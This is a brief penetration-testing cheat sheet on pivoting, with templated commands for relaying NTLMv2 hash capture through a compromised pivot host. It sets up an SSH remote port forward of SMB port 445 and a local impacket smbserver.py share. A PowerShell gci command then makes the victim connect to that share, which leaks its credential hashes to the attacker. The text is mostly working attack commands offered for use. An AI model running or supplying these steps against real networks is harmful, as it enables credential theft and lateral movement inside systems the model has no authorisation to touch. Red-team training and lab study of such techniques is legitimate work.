# Pivoting tips

## Forward NTLMv2 hash through pivot machine using SSH tunneling
```
# On pivot machine
ssh -R <Victim IP>:<PORT TO FORWARD>:127.0.0.1:<PORT TO FORWARD>
exple : 445 to forward SMB connection
check if ssh config is correct, cf 'ssh remote port forwarding' command

# Locally
sudo smbserver.py <SHARENAME> . -smb2support

# On victim machine
Make the victim machine initiate an SMB connection to the pivot machine using for example : gci \\<PIVOT machine IP> OR <PIVOT machine DNS name>\<SHARENAME>\foo
```
